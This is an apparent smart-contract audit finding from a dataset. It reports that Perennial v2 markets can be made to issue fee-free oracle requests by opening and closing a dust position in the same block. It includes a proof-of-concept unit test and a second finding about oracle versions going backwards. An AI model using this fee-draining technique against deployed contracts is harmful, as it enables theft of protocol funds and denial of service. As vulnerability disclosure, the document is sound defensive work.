# [M] Drained oracle fees from market by depositing and withdrawing in the same block

## Summary
Severity: Medium
Contest weight: 0.4921
Dataset id: 20256
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Market advances in the id of the Global and Local states by fetching latestVersion and currentTimestamp from the oracle, increasing it if there is an update. When a new position is updated by calling update(), if the order is not empty (when there is a modification in the maker, long or short amounts), it requests a new version from the oracle. This means that users can trigger a request with the smallest position possible (1), not paying any fees. Fetching a price in the oracle is expensive, thus Perennial attributes an oracleFee to the oracle, which is then fed to the keeper for commiting prices in the oracle. Notice that anyone can be the keeper, the only requirement is to submit a valid price to the oracle. In the oracle, the incentive is only paid if there was a previous request, most likely from Market (can be any authorized entity). As the oracleFee is only increased on settlements, an oracle request can be triggered at any block (only 1 request per block is allowed) by depositing and withdrawing in the same block, without providing any settlement fee. Thus, this mechanism can be exploited to give maximum profit to the keeper, which would force the protocol to manually add fees to the oracle or be DoSed (could be both). Theft of yield and protocol funds by abusing the keeper role and DoS of the Market. Added the following test to Market.test.ts, proving that the request can be triggered without paying any fees. The attacker would then proceed to commit a price to the oracle and get the fees (possible at every block), until there are no more fees in the Market.
```solidity
it.only('POC opens and closes the position to trigger an oracle request without paying any fee', async () => {
    const dustCollateral = parse6decimal("100");
    const dustPosition = parse6decimal("0.000001");
    dsu.transferFrom.whenCalledWith(user.address, market.address, dustCollateral.mul(1e12)).returns(true)
    await expect(market.connect(user).update(user.address, dustPosition, 0, 0, dustCollateral, false))
    .to.emit(market, 'Updated')
    .withArgs(user.address, ORACLE_VERSION_2.timestamp, dustPosition, 0, 0, dustCollateral, false)
    expectLocalEq(await market.locals(user.address), {
        currentId: 1,
        latestId: 0,
        collateral: dustCollateral,
        reward: 0,
        protection: 0,
    })
    expectPositionEq(await market.positions(user.address), {
        ...DEFAULT_POSITION,
        timestamp: ORACLE_VERSION_1.timestamp,
    })
    expectPositionEq(await market.pendingPositions(user.address, 1), {
        ...DEFAULT_POSITION,
        timestamp: ORACLE_VERSION_2.timestamp,
        maker: dustPosition,
        delta: dustCollateral,
    })
    expectGlobalEq(await market.global(), {
        currentId: 1,
        latestId: 0,
        protocolFee: 0,
        oracleFee: 0,
        riskFee: 0,
        donation: 0,
    })
    expectPositionEq(await market.position(), {
        ...DEFAULT_POSITION,
        timestamp: ORACLE_VERSION_1.timestamp,
    })
    expectPositionEq(await market.pendingPosition(1), {
        ...DEFAULT_POSITION,
        timestamp: ORACLE_VERSION_2.timestamp,
        maker: dustPosition,
    })
    expectVersionEq(await market.versions(ORACLE_VERSION_1.timestamp), {
        makerValue: { _value: 0 },
        longValue: { _value: 0 },
        shortValue: { _value: 0 },
        makerReward: { _value: 0 },
        longReward: { _value: 0 },
        shortReward: { _value: 0 },
    })
    dsu.transfer.whenCalledWith(user.address, dustCollateral.mul(1e12)).returns(true)
    await expect(market.connect(user).update(user.address, 0, 0, 0, dustCollateral.mul(-1), false))
    .to.emit(market, 'Updated')
    .withArgs(user.address, ORACLE_VERSION_2.timestamp, 0, 0, 0, dustCollateral.mul(-1), false)
    expect(oracle.request).to.have.been.calledWith(user.address)
})
```

## Recommendation
Whitelist the keeper role to prevent malicious users from figuring out ways to profit from the incentive mechanism. Additionally, the whitelisted keepers could skip oracle requests if they don't contribute to settlements (when there are no orders to settle), to ensure that funds are always available. In addition to the invariant of newPrice.publishTime > lastCommittedPublishTime, make sure newLatestVersion > oldLatestVersion. arjun-io From WatchPug, https://github.com/equilibria-xyz/perennial-v2/blob/f216b2fd0ec45ea22b443a00fdfe2257f803ce7c/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L89-L102 latest() may unexpectedly go back in time. Given: versionList[18]: 18:59:58 versionList[19]: 19:00:00 nextVersionIndexToCommit: 11 When: • commit({versionIndex: 19, oracleVersion: 18:59:59, updateData: (pyth data of 19:00:03)}) – At L180, oracleVersion == versionList[versionIndex] i.e., 18:59:59 == 19:00:00 is false, so it won't enter commitRequested() – commit() does not have a check like commitRequested() L153-L157, so it can skip versionIndex: 18, even if updateData is a valid price for versionIndex: 18 • At this point, latest() returns OracleVersion(timestamp: 18:59:59, ...) • commitRequested({versionIndex: 18, updateData: (pyth data of 19:00:04)}) – commitRequested() does not have a check like commit() L199's newLatestVersion > oldLatestVersion (i.e., versionToCommit > _latestVersion) • At this point, latest() returns OracleVersion(timestamp: 18:59:58, ...) In addition to the invariant of newPrice.publishTime > lastCommittedPublishTime, make sure newLatestVersion > oldLatestVersion. We've oped to fix this by setting the nextVersionIndexToCommit in the unrequested commit flow fix: https://github.com/equilibria-xyz/perennial-v2/pull/100
